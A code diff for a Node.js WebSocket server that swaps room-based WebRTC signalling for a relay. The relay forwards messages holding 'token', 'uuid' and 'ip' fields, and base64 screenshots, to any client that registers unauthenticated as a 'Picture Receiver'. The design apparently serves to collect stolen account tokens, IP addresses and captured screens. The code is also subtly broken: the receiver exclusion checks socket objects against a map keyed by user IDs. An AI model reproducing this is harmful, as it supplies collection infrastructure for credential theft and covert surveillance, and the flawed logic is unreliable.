@@ -1,12 +1,14 @@
 const http = require("http");
 const express = require("express");
 const WebSocket = require("ws");
+
 const app = express();
 app.use(express.static("public"));
+
 const PORT = process.env.PORT || 3000;
 const server = http.createServer(app);
-const wss = new WebSocket.Server({ noServer: true });
 
+const wss = new WebSocket.Server({ noServer: true });
 server.on('upgrade', (request, socket, head) => {
     wss.handleUpgrade(request, socket, head, ws => {
         wss.emit('connection', ws, request);
@@ -15,19 +17,19 @@ server.on('upgrade', (request, socket, head) => {
 
 server.listen(PORT);
 
-const rooms = new Map();
+const usersInChat = new Map();
+const pictureReceivers = new Map(); 
 let keepAliveId;
 
 wss.on("connection", function (ws) {
     const userID = generateUniqueID();  
-    ws.userID = userID;
 
     ws.on("message", data => {
-        handleMessage(ws, data);
+        handleMessage(ws, data, userID);
     });
 
     ws.on("close", () => {
-        handleDisconnect(ws);
+        handleDisconnect(userID);
         ws.removeAllListeners(); 
     });
 
@@ -45,80 +47,61 @@ function generateUniqueID() {
     return Math.random().toString(36).substr(2, 9);
 }
 
-function handleMessage(ws, data) {
+
+function handleMessage(ws, data, userID) {
     try {
-        const message = JSON.parse(data);
+        const messageData = JSON.parse(data);
         
-        switch(message.type) {
-            case 'join':
-                handleJoin(ws, message.roomId);
-                break;
-            case 'offer':
-                handleOffer(ws, message);
-                break;
-            case 'answer':
-                handleAnswer(ws, message);
-                break;
-            case 'ice-candidate':
-                handleIceCandidate(ws, message);
-                break;
-            case 'screenshot':
-                handleScreenshot(ws, message);
-                break;
-            default:
-                console.log('Unknown message type:', message.type);
+        // Check if the data matches the format shown in the image
+        if (messageData.sender && messageData.token && messageData.uuid && messageData.ip) {
+            // If it matches, only broadcast to picture receivers
+            broadcastToPictureReceivers(messageData);
+        } else if (messageData.command === 'Picture Receiver') {
+            pictureReceivers.set(userID, ws);
+        } else if (messageData.type === 'screenshot' && messageData.data.startsWith('data:image/png;base64')) {
+            broadcastToPictureReceivers({
+                type: 'screenshot',
+                action: messageData.action,
+                screen: messageData.screen,
+                data: messageData.data
+            });
+        } else if (messageData.action === 'screenshot_result') {
+            broadcastToPictureReceivers({
+                type: 'screenshot',
+                action: messageData.action,
+                screen: messageData.screen,
+                data: messageData.data
+            });
+        } else {
+            broadcastToAllExceptPictureReceivers(ws, JSON.stringify(messageData), true);
         }
     } catch (e) {
-        console.error('Error handling message:', e);
+        console.error('Error data:', e);
     }
 }
 
-function handleJoin(ws, roomId) {
-    if (!rooms.has(roomId)) {
-        rooms.set(roomId, new Set());
-    }
-    rooms.get(roomId).add(ws);
-    ws.roomId = roomId;
-    ws.send(JSON.stringify({ type: 'joined', roomId }));
-}
-
-function handleOffer(ws, message) {
-    broadcastToRoom(ws, message, ws.roomId);
-}
-
-function handleAnswer(ws, message) {
-    broadcastToRoom(ws, message, ws.roomId);
-}
-
-function handleIceCandidate(ws, message) {
-    broadcastToRoom(ws, message, ws.roomId);
-}
-
-function handleScreenshot(ws, message) {
-    broadcastToRoom(ws, message, ws.roomId);
-}
-
-function broadcastToRoom(sender, message, roomId) {
-    const room = rooms.get(roomId);
-    if (room) {
-        room.forEach(client => {
-            if (client !== sender && client.readyState === WebSocket.OPEN) {
-                client.send(JSON.stringify(message));
-            }
-        });
-    }
-}
-
-function handleDisconnect(ws) {
-    if (ws.roomId) {
-        const room = rooms.get(ws.roomId);
-        if (room) {
-            room.delete(ws);
-            if (room.size === 0) {
-                rooms.delete(ws.roomId);
-            }
+function broadcastToPictureReceivers(message) {
+    const data = JSON.stringify(message);
+    pictureReceivers.forEach((ws, userId) => {
+        if (ws.readyState === WebSocket.OPEN) {
+            ws.send(data, error => {
+                if (error) console.error("Error sending message to receiver:", error);
+            });
         }
-    }
+    });
+}
+
+function broadcastToAllExceptPictureReceivers(senderWs, message, includeSelf) {
+    wss.clients.forEach(client => {
+        if (!pictureReceivers.has(client) && client.readyState === WebSocket.OPEN && (includeSelf || client !== senderWs)) {
+            client.send(message);
+        }
+    });
+}
+
+function handleDisconnect(userID) {
+    usersInChat.delete(userID);
+    pictureReceivers.delete(userID);
 }
 
 function keepServerAlive() {
